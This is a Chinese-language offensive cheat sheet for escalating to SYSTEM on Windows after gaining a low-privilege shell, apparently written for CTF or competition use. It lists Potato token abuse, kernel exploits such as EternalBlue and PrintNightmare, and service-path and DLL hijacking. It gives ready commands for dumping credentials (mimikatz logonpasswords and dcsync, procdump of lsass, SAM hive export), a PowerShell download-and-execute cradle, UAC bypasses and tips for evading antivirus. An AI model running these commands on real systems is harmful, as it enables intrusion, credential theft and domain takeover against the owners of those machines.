# Windows 提权（拿到低权 shell 后）

> 顺序：`whoami /priv` 看令牌特权（最快路）→ `systeminfo` 丢 wesng / winPEAS 出内核编号 → 服务配置错 → 凭据抓取。杀软在场时优先"静"姿势（procdump + 离线解）。

## 令牌特权（whoami /priv，第一优先看）

| 特权 | 姿势 |
|------|------|
| **SeImpersonatePrivilege**（服务账号/IIS 常见） | **Potato 全家桶**：JuicyPotato（≤2016 常用）、RoguePotato、**SweetPotato/GodPotato**（2016+ 补丁后）。监听 135 + COM 指向 → SYSTEM |
| SeAssignPrimaryTokenPrivilege | 同 Potato 系可用 |
| **SeBackupPrivilege** | `robocopy /b` 拷 `C:\Windows\NTDS\NTDS.dit`（域控）或 SAM/SYSTEM → 离线拉 hash |
| SeRestorePrivilege | 覆写系统文件起服务 |
| SeTakeOwnershipPrivilege | 接管文件（`takeown /f`）改Utilman 等粘滞键换 cmd |
| SeDebugPrivilege | 直接起 mimikatz（或迁移到 SYSTEM 进程） |

## 内核（systeminfo → wesng / Sherlock 对编号）

| 编号 | 场景 |
|------|------|
| **MS17-010 永恒之蓝** | 老靶机通杀（2008/7/2012 未打补丁），直接 msf `ms17_010_eternalblue` 或 zzz.exe 一把梭。**比赛见到 SMB 445 的 Windows 直接先试它** |
| **CVE-2021-1675 PrintNightmare** | 带打印服务的广泛版本，公开 DLL 路径 EXP |
| CVE-2021-36934 HiveNightmare | 读 SAM/SYSTEM 离线解 |
| MS16-032 | 2008/2012 一代，公开 EXP |
| CVE-2020-0787 / CVE-2019-1388 | BITS / UAC 提权弹窗链 |
| MS08-067 / MS06-040 | XP/2003 古董靶机 |

## 服务配置错误

- **未加引号的服务路径**（Unquoted Path）：
  ```
  wmic service get name,pathname,startmode | findstr /i "Program" | findstr /i /v "C:\Windows"
  ```
  路径有空格无引号（`C:\Program Files\xxx\service.exe`）且上级目录可写 → 放 `C:\Program.exe` → `sc stop/start 服务名`（或重启）触发
- 服务二进制/目录 ACL 可写（accesschk / PrintSpoofer 套装查）：换 EXE 成反弹 → 重启服务
- **DLL 劫持**：服务进程加载的 DLL 在可写目录 → 用 msfvenom 生成同名恶意 DLL
- **AlwaysInstallElevated**：
  ```
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  两处都是 1 → msiexec /quiet /qn /i 反弹.msi 直接 SYSTEM
- 计划任务：`schtasks /query /fo LIST /v` 找以更高权限跑且指向可写路径的任务
- 注册表自动登录凭据：
  ```
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  ```

## UAC 绕过（当前是管理员但 UAC 拦着）

- `fodhelper.exe`（注册表 hijack + 计算器换 cmd）、`eventvwr.exe`、`computerdefaults.exe` —— 公开脚本一把梭（UACME 仓库 60+ 姿势按版本挑）
- msf：`exploit/windows/local/bypassuac` 系列

## 凭据抓取（横向的种子）

- **mimikatz**（有杀软时先 `privilege::debug`，或用加密混淆版/CS/profile）：
  ```
  sekurlsa::logonpasswords     # 抓内存登录凭据（明文密码+NTLM）
  lsadump::sam                 # 本机 SAM
  lsadump::dcsync /domain:x /user:administrator   # 域控场景拉任意用户hash
  ```
- 被拦 → `procdump -ma lsass.exe lsass.dmp`（微软签名工具不报毒）→ 拖回攻击机 `pypykatz` 离线解
- 无工具时原生收集：
  ```
  reg save hklm\sam sam.hive & reg save hklm\system system.hive
  cmdkey /list                    # 存的凭据
  dir /a C:\Users\*\Desktop C:\Users\*\Documents
  type C:\Users\*\AppData\Roaming\*.txt 2>nul
  net user /domain      # 查域用户
  ```
- 浏览器密码（Chrome `Login Data` / Firefox `logins.json`）、WiFi 密码（`netsh wlan show profile name=X key=clear`）、IIS appcmd 配置里的连接串、`C:\Windows\sysprep\unattend.xml`、`Panther` 目录装机密码

## 落地通道

- 反弹不稳/杀软拦 exe → powershell 一句话（`powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(...)"`），或 certutil/vbitsadmin 下载落地分步走
- 正向更稳时：`netsh advfirewall firewall add rule` 开端口 → 正向 msf/mimikatz

## 假点

- `whoami /priv` 空 → 才去磨内核，别反过来
- 永久之蓝 EXP 弹了窗口没回连 → 检查双脉冲端口/架构（x64 EXE 打 x86 系统）
- Potato 报成功但 shell 还是低权 → 认 SYSTEM 判据是 `whoami` 出 `nt authority\system`
- systeminfo 补丁列表看不出缺啥 → wesng 比眼睛可靠；打补丁的编号换下一个
- 360/火绒在场 → 先找带签名工具（procdump、RDP 键盘记录思路）+ 白名单路径（`C:\Windows\Temp` 常被盯，用 `C:\ProgramData` 深层）
